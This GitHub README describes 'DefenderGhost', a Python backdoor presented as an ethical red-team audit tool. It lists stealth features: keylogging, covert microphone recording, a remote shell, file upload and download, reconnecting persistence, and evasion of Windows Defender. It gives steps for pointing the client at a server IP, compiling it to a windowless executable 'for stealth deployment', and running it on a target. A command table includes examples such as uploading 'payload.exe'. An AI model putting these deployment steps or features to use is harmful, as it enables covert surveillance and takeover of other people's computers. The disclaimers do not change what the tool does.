

# 🛡️ DefenderGhost – Stealth-Based Security Audit & Remote Access Framework

> A lightweight, stealth-capable system for ethical remote auditing, penetration testing, and cybersecurity simulations.

---

## 🚀 Overview

**DefenderGhost** is a Python-based remote system audit and control framework, designed to operate silently in controlled, ethical environments. It enables cybersecurity professionals, researchers, and red teams to simulate real-world attack scenarios, perform forensic analysis, and manage systems remotely — all while bypassing detection by antivirus solutions such as Windows Defender.

> ⚠️ **For authorized, educational, and testing use only.** Unauthorized or malicious use is strictly prohibited.

---

## 🧩 Key Features

- 📁 **Remote File Management**  
  Upload, download, create, or delete files and directories.

- 🖥️ **Live Shell Execution**  
  Send and execute system commands remotely with full output feedback.

- 🎙️ **Audio Recording**  
  Record and transmit audio from the client’s microphone in real-time.

- 🎹 **Keylogging**  
  Log key presses securely in stealth mode.

- 🔄 **Persistent Connection**  
  Automatically reconnects if the client-server socket drops.

- 🛡️ **AV Evasion**  
  Operates silently without triggering Windows Defender or similar AV solutions.

---

## 🗺️ System Flow Diagram

The diagram below illustrates the core working of the **DefenderGhost** framework—from initialization to command execution and data return in a secure, stealth environment.

![DefenderGhost FlowChart](https://github.com/user-attachments/assets/d1cbd6cb-5076-4fd6-baaf-70bbe594d6e7)

> **Note:** This framework is designed to simulate real-world red team operations within legal and authorized boundaries.

---


## ⚙️ Setup Instructions

### 1. 🔧 Configuration
Before use, update both `backdoor.py` (client) and `server.py` (host controller) with your desired IP address.
````markdown
```python
# In backdoor.py and server.py
s.connect(('Your.Server.IP', 5555))
````

### 2. 📦 Optional: Compile to Executable (for stealth deployment)

Use **PyInstaller** to convert the client script into a `.exe`:

```bash
pip install pyinstaller
python -m PyInstaller --onefile --noconsole backdoor.py
```

> The output executable will be found in the `dist/` directory.

---

## 🖥️ Usage

### 1. Start the server

```bash
python server.py
```

### 2. Deploy the client (`backdoor.py` or compiled `.exe`) on the target system.

### 3. Use the server terminal to send commands like:

* `download filename`
* `upload filename`
* `makedir newfolder`
* `rmdir foldername`
* `keylogger`
* `vcrecord`
* `listdir`
* `quit`

A full list of available commands will be shown after connection.

### 🧭 **Command Reference**

```markdown
## 🧭 Command Reference

Below is a list of supported remote commands you can send from the server to the connected target system.

| Command             | Description                                          | Example Usage               |
|---------------------|------------------------------------------------------|-----------------------------|
| `download <file>`   | Downloads a file from the target system              | `download report.pdf`       |
| `upload <file>`     | Uploads a file to the target system                  | `upload payload.exe`        |
| `makefile <name>`   | Creates a blank file on the target system            | `makefile notes.txt`        |
| `remove <file>`     | Deletes a file on the target system                  | `remove notes.txt`          |
| `makedir <name>`    | Creates a directory on the target system             | `makedir logs`              |
| `rmdir <name>`      | Deletes a directory from the target system           | `rmdir logs`                |
| `listdir`           | Lists contents of the root directory on target       | `listdir`                   |
| `vcrecord`          | Records 10 seconds of audio and uploads it as WAV    | `vcrecord`                  |
| `keylogger`         | Starts keylogging on the target system               | `keylogger`                 |
| `cd <path>`         | Changes the current directory on the target system   | `cd C:/Users/Apoorv/Desktop`|
| `clear`             | Clears the server-side terminal output (cosmetic)    | `clear`                     |
| `quit`              | Ends the current session and closes the connection   | `quit`                      |
```

---

## 📘 Ethical Guidelines

> **DefenderGhost is a cybersecurity research tool** and must be used under the following conditions:

* ✅ Only in environments where you have **explicit permission**.
* ✅ For **ethical hacking**, **red team simulations**, or **forensic training**.
* ❌ Never use on systems or devices without consent.
* ❌ Never use for malicious activity or unauthorized spying.

Failure to follow ethical guidelines may violate laws and lead to serious legal consequences.

---

## ⚠️ Disclaimer

This software is provided for **educational and research purposes only**.
The author **is not responsible** for any misuse or damage caused by this project.
Use responsibly and within the legal boundaries of your region.

---

## 📈 Future Plans

Planned features for upcoming versions:

* 📸 Webcam capture
* 📷 Screenshot capture
* 🌐 Network scanner
* 🔑 Encrypted command exchange

Contributions and suggestions are welcome via pull requests or issues.

---

## 🔗 Author

**Apoorv Gupta**
[GitHub](https://github.com/iapoorv01) • [LinkedIn](https://www.linkedin.com/in/-apoorv-/) • [Email](mailto:apoorv041@gmail.com)

---

> 🎯 *"DefenderGhost doesn't just audit — it operates like a shadow."*


